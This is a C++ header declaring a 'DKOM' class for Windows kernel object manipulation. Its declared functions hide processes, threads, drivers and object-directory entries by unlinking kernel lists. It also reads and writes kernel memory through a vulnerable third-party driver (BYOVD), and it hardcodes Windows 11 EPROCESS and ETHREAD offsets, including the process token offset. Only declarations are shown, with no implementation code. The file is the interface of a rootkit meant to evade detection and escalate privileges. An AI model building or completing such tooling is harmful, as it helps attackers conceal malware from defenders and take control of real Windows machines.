#pragma once
#include <windows.h>
#include <vector>
#include <string>
#include <optional>

namespace l4g::kernel {

struct DKOMResult {
    bool success = false;
    std::string error;
};

class DKOM {
public:
    // Hide process from PsActiveProcessHead (EPROCESS ActiveProcessLinks)
    static DKOMResult hide_process(HANDLE pid);
    
    // Unhide process
    static DKOMResult unhide_process(HANDLE pid);
    
    // Hide thread from ETHREAD ThreadListEntry
    static DKOMResult hide_thread(HANDLE tid);
    
    // Hide driver from PsLoadedModuleList
    static DKOMResult hide_driver(const wchar_t* driver_name);
    
    // Hide object from object directory
    static DKOMResult hide_object(const wchar_t* object_path);
    
    // Find EPROCESS by PID
    static uint64_t find_eprocess(HANDLE pid);
    
    // Find ETHREAD by TID
    static uint64_t find_ethread(HANDLE tid);
    
    // Read kernel memory via BYOVD
    static bool read_kernel(uint64_t address, void* buffer, size_t size);
    static bool write_kernel(uint64_t address, const void* buffer, size_t size);
    
    // Offsets (Windows 11 22H2/23H2 - need per-build derivation)
    struct Offsets {
        uint32_t eprocess_active_process_links = 0x448;
        uint32_t eprocess_unique_process_id = 0x440;
        uint32_t eprocess_image_file_name = 0x5A8;
        uint32_t eprocess_token = 0x4B8;
        uint32_t ethread_thread_list_entry = 0x4E8;
        uint32_t ethread_client_id = 0x6D0;
        uint32_t ldr_data_table_entry_in_load_order = 0x30;
        uint32_t ldr_data_table_entry_base_dll_name = 0x58;
        uint32_t ldr_data_table_entry_dll_base = 0x30;
    };
    
    static Offsets& get_offsets();
    static bool derive_offsets();  // Hunt offsets at runtime
    
private:
    static uint64_t g_ps_active_process_head;
    static uint64_t g_ps_loaded_module_list;
};

} // namespace l4g::kernel